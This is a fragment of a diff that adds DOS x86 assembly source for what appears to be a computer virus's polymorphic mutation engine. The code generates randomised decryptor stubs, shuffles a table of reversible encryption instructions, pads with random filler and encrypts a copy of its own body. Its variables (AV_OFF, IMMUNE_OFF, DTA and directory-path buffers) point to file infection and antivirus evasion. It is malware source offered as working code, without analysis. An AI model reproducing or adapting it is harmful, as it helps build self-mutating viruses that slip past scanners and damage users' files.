+        XOR DX,DX
+TAILSL: TEST DI,000FH
+        JE TAILPA
+        CALL DS:[MTAB_RND]
+        AND AX,000FH
+        XLAT
+        STOSB
+        INC DX
+        JMP TAILSL
+TAILPA: POP BX
+        MOV SI,OFFSET MUT_COPY
+        MOV CX,OFFSET DONE-OFFSET STAR
+        CLD
+        REP MOVSB
+        CALL DS:[MTAB_RND]
+        AND AX,1H
+        ADD DI,AX
+        MOV AX,OFFSET DECRYPT
+        AND AX,0FFF0H
+        ADD AX,0010H
+        SUB DI,AX
+        MOV WORD PTR DS:[SIZ],DI
+        MOV DI,DS:[EOFF]
+        MOV BYTE PTR DS:[DI],0C3H
+        MOV AX,OFFSET DONE-OFFSET STAR
+        ADD AX,BX
+        ADD AX,DX
+        XOR DX,DX
+        DIV WORD PTR DS:[INST]
+        SHR AX,1H
+        MOV CX,AX
+        INC CX
+        MOV DI,DS:[MOVCX]
+        MOV WORD PTR DS:[DI],CX
+        POP DI
+        PUSH DI
+        MOV BX,DS:[CALL_OFF]
+        SUB DI,BX
+        MOV SI,DS:[ADDSI]
+        MOV WORD PTR DS:[SI],DI
+        POP DI
+        MOV SI,DI
+TAILE:  MOV AX,OFFSET ENCRYPT
+        CALL AX
+        LOOP TAILE
+        MOV DX,OFFSET DECRYPT
+        AND DX,0FFF0H
+        ADD DX,0010H
+        MOV CX,DS:[SIZ]
+        RETN
+BTAIL@:
+
+INCDOFF:INC DI
+        INC DI
+        PUSH DI
+        POP SI
+        MOV SI,DI
+
+        INC SI
+        INC SI
+        PUSH SI
+        POP DI
+        MOV DI,SI
+INCDOFF@:
+
+
+
+TOP:    DEC CX
+        JE TOP1
+        JMP STAR
+TOP1:   DEC CX
+        JCXZ TOP@
+        JMP STAR
+TOP@:
+
+HEAD:   MOV BYTE PTR DS:[PUTCLD],NO
+        MOV BYTE PTR DS:[PUTCX],NO
+        MOV BYTE PTR DS:[FORCE],NO
+        MOV BX,DS:[MTAB_HOP]
+        MOV SI,BX
+        CALL CALL_EM
+        CLD
+        MOVSB
+        PUSH DI
+        XOR AX,AX
+        CLD
+        STOSW
+        MOV WORD PTR DS:[CALL_OFF],DI
+        CALL CALL_EM
+        POP AX
+        PUSH BX
+        MOV BX,AX
+        MOV CX,DS:[FILL_CNT]
+        JCXZ HEAD_ZER
+HEAD_LP:CALL DS:[MTAB_RND]
+        TEST AL,1H
+        JNE HEAD_NI
+        INC BYTE PTR DS:[BX]
+HEAD_NI:LOOP HEAD_LP
+HEAD_ZER:POP BX
+        INC SI
+        INC SI
+        CALL DS:[MTAB_RND]
+        AND AX,0001H
+        MOV DX,AX
+        CLD
+        LODSB
+        OR AL,DL
+        CLD
+        STOSB
+        CALL CALL_EM
+        CLD
+        MOVSB
+        CLD
+        LODSB
+        OR AL,DL
+        CLD
+        STOSB
+        XOR AX,AX
+        MOV WORD PTR DS:[ADDSI],DI
+        CLD
+        STOSW
+        CALL CALL_EM
+        CALL DS:[MTAB_RND]
+        TEST AL,1H
+        JNE HEAD_E
+        CLD
+        LODSB
+        OR AL,DL
+        CLD
+        STOSB
+        CALL CALL_EM
+        MOV AL,DS:[BX+3H]
+        MOV DH,DL
+        NEG DH
+        INC DH
+        OR AL,DH
+        CLD
+        STOSB
+        JMP SHORT HEAD_E1
+HEAD_E: INC SI
+        CLD
+        MOVSB
+        CLD
+        LODSB
+        MOV CL,4H
+        SHL AX,CL
+        PUSH CX
+        MOV CL,DL
+        SHL AL,CL
+        POP CX
+        SHR AX,CL
+        CLD
+        STOSB
+HEAD_E1:MOV BYTE PTR DS:[FORCE],YES
+        CALL CALL_EM
+        MOV WORD PTR DS:[DOFF],DI
+        MOV WORD PTR DS:[DEC_START],DI
+        RETN
+CALL_EM:CALL DS:[MTAB_FILL]
+        CALL DS:[MTAB_PUTCL]        
+        RETN
+HEAD@:
+
+HOP:    DB 0E8H         ;CALL
+        DB 0FCH         ;CLD
+        DB 0B9H         ;MOV CX,
+        DB 5EH          ;POP SI 5FH = POP DI
+        DB 81H          ;ADD 
+        DB 0C6H         ;SI       C7H = DI
+        DB 56H          ;PUSH SI  57H = PUSH DI
+        DB 89H          ;MOV 
+        DB 0F7H         ;DI,SI 0FEH = SI,DI
+HOP@:
+
+PUTCL:  PUSH AX
+        CALL DS:[MTAB_RND]
+        CMP BYTE PTR DS:[FORCE],YES
+        JE PUTCL_F
+        TEST AL,01H
+        JNE PUTCL_NO
+PUTCL_F:CMP BYTE PTR DS:[PUTCLD],YES
+        JE PUTCL_NO
+        MOV AL,DS:[BX+1H]
+        CLD
+        STOSB
+        CALL DS:[MTAB_FILL]
+        MOV BYTE PTR DS:[PUTCLD],YES
+PUTCL_NO:CALL DS:[MTAB_RND]
+        CMP BYTE PTR DS:[FORCE],YES
+        JE PUTCL_F1
+        TEST AL,1H
+        JNE PUTCL_NO1
+PUTCL_F1:CMP BYTE PTR DS:[PUTCX],YES
+        JE PUTCL_NO1
+        MOV AL,DS:[BX+2H]
+        CLD
+        STOSB
+        MOV WORD PTR DS:[MOVCX],DI
+        XOR AX,AX
+        CLD
+        STOSW
+        CALL DS:[MTAB_FILL]
+        MOV BYTE PTR DS:[PUTCX],YES 
+PUTCL_NO1:POP AX
+        RETN
+PUTCL@:
+
+LODSTO  DB 0ADH,0ABH
+LODSTO@:
+
+ETAB:   DW OFFSET E1-OFFSET ETAB,OFFSET E2-OFFSET ETAB,OFFSET E3-OFFSET ETAB,OFFSET E4-OFFSET ETAB,OFFSET E5-OFFSET ETAB
+        DW OFFSET E6-OFFSET ETAB,OFFSET E7-OFFSET ETAB,OFFSET E8-OFFSET ETAB,OFFSET E9-OFFSET ETAB,OFFSET E10-OFFSET ETAB,OFFSET E11-OFFSET ETAB
+        DW OFFSET E12-OFFSET ETAB,OFFSET E13-OFFSET ETAB,OFFSET E14-OFFSET ETAB,OFFSET E15-OFFSET ETAB,OFFSET E16-OFFSET ETAB,OFFSET E17-OFFSET ETAB
+        DW OFFSET E18-OFFSET ETAB,OFFSET E19-OFFSET ETAB,OFFSET E20-OFFSET ETAB,OFFSET E21-OFFSET ETAB,OFFSET E22-OFFSET ETAB,OFFSET E23-OFFSET ETAB
+        DW OFFSET E24-OFFSET ETAB,OFFSET E25-OFFSET ETAB,OFFSET E26-OFFSET ETAB,OFFSET E27-OFFSET ETAB,OFFSET E28-OFFSET ETAB,OFFSET E29-OFFSET ETAB
+        DW OFFSET E30-OFFSET ETAB,OFFSET E31-OFFSET ETAB,OFFSET E32-OFFSET ETAB
+        ;xxxxyyyy = xxxx EQUALS SIZE OF INSTRUCTION
+        ;0xxx = INDIRECT  1xxx = LODSW
+        ;x0xx = ADD       x1xx = NO ADD
+        ;xx0x = WORD      xx1x = BYTE (ONLY COUNTS IF ADD BIT IS ZERO)
+        ;xxx0 = [SI]      xxx1 = [SI+1H]
+E1:     DB 01000000B                 ;4,I,A,W
+        ADD WORD PTR DS:[SI],1234H
+        SUB WORD PTR DS:[SI],1234H
+E2:     DB 00110010B                 ;3,I,A,B
+        ADD BYTE PTR DS:[SI],12H
+        SUB BYTE PTR DS:[SI],12H
+E3:     DB 01000011B                 ;4,I,A,B
+        ADD BYTE PTR DS:[SI+1H],12H
+        SUB BYTE PTR DS:[SI+1H],12H
+E4:     DB 00100100B                 ;2,I,N
+        ROR WORD PTR DS:[SI],CL
+        ROL WORD PTR DS:[SI],CL
+E5:     DB 00100100B                 ;2,I,N
+        ROR BYTE PTR DS:[SI],CL 
+        ROL BYTE PTR DS:[SI],CL
+E6:     DB 00110101B                 ;3,I,N
+        ROR BYTE PTR DS:[SI+1H],CL
+        ROL BYTE PTR DS:[SI+1H],CL
+E7:     DB 00100100B                 ;2,I,N
+        NOT WORD PTR DS:[SI]
+        NOT WORD PTR DS:[SI]
+E8:     DB 00100100B                 ;2,I,N
+        NOT BYTE PTR DS:[SI]
+        NOT BYTE PTR DS:[SI]
+E9:     DB 00110101B                 ;3,I,N
+        NOT BYTE PTR DS:[SI+1H] 
+        NOT BYTE PTR DS:[SI+1H]
+E10:    DB 00100100B                 ;2,I,N   
+        ADD WORD PTR DS:[SI],CX
+        SUB WORD PTR DS:[SI],CX
+E11:    DB 00100100B                 ;2,I,N   
+        ADD BYTE PTR DS:[SI],CL
+        SUB BYTE PTR DS:[SI],CL
+E12:    DB 00110101B                 ;3,I,N   
+        ADD BYTE PTR DS:[SI+1H],CL
+        SUB BYTE PTR DS:[SI+1H],CL      
+E13:    DB 00100100B                 ;2,I,N
+        NEG WORD PTR DS:[SI]
+        NEG WORD PTR DS:[SI]
+E14:    DB 00100100B                 ;2,I,N   
+        NEG BYTE PTR DS:[SI]    
+        NEG BYTE PTR DS:[SI]
+E15:    DB 00110101B                 ;3,I,N   
+        NEG BYTE PTR DS:[SI+1H]
+        NEG BYTE PTR DS:[SI+1H]
+E16:    DB 00111000B                 ;3,L,A,W
+        ADD AX,1234H
+        SUB AX,1234H
+E17:    DB 00111010B                 ;3,L,A,B
+        ADD AH,12H
+        SUB AH,12H
+E18:    DB 00101010B                 ;2,L,A,B
+        ADD AL,12H
+        SUB AL,12H
+E19:    DB 00101100B                 ;2,L,N   
+        ADD AX,CX
+        SUB AX,CX
+E20:    DB 00101100B                 ;2,L,N
+        ADD AL,CL
+        SUB AL,CL
+E21:    DB 00101100B                 ;2,L,N
+        ADD AL,CH
+        SUB AL,CH
+E22:    DB 00101100B                 ;2,L,N   
+        ADD AH,CL
+        SUB AH,CL
+E23:    DB 00101100B                 ;2,L,N
+        XCHG AL,AH
+        XCHG AL,AH
+E24:    DB 00101100B                 ;2,L,N   
+        NOT AX
+        NOT AX
+E25:    DB 00101100B                 ;2,L,N
+        NOT AL
+        NOT AL
+E26:    DB 00101100B                 ;2,L,N
+        NOT AH
+        NOT AH
+E27:    DB 00101100B                 ;2,L,N
+        NEG AX
+        NEG AX
+E28:    DB 00101100B                 ;2,L,N   
+        NEG AH
+        NEG AH
+E29:    DB 00101100B                 ;2,L,N 
+        NEG AL
+        NEG AL
+E30:    DB 00101100B
+        ROR AX,CL
+        ROL AX,CL
+E31:    DB 00101100B
+        ROR AL,CL
+        ROL AL,CL
+E32:    DB 00101100B
+        ROR AH,CL
+        ROL AH,CL
+ETAB@:
+
+ALTTAB: MOV CX,7FH
+ALTTABL:MOV DI,DS:[MTAB_ETAB]
+        MOV SI,DI
+        CALL DS:[MTAB_RND]
+        AND AX,1FH
+        SHL AX,1H
+        ADD DI,AX
+        CALL DS:[MTAB_RND]
+        AND AX,1FH
+        SHL AX,1H
+        ADD SI,AX
+        CMP SI,DI
+        JE ALTTABL
+        MOV AX,DS:[SI]
+        XCHG AX,DS:[DI]
+        MOV WORD PTR DS:[SI],AX
+        LOOP ALTTABL
+        RETN
+ALTTAB@:
+        DW 0H
+DONE:       
+
+
+AV_OFF          DW ?
+IMMUNE_OFF      DW ?
+OLD_DTA_BX      DW ?
+OLD_DTA_ES      DW ?
+DIR_OFF         DW ?
+PATH_OFF        DW ?
+RANDOM          DW ?
+LAST            DW ?
+EOFF            DW ?
+DOFF            DW ?
+ADDSI           DW ?
+SIZ             DW ?
+MOVCX           DW ?
+ECNT            DW ?
+INST            DW ?
+CALL_OFF        DW ?
+DEC_START       DW ?
+FILL_CNT        DW ?
+WRITE_BYTE      DB ?
+PATH_END        DB ?
+FILLB           DB ?
+FORCE           DB ?
+PUTCLD          DB ?
+PUTCX           DB ?
+
+
+SHORT_BUFF      DB 10H DUP(0)
+
+BUFFER          DB 75 DUP(0)
+
+NEW_DTA         DB 128 DUP(0)
+
+NEW_DIR:        DB 80 DUP(0)
+
+MUT_SCAN_TAB    DB 40H DUP(0)
+
+MUT_COPY        DB OFFSET DONE-OFFSET STAR DUP(0)
+
+ENCRYPT:        DB 512 DUP(0)
+
+DECRYPT         DB 0H
+
+CSEG ENDS
+
+
+
+
+
+
+
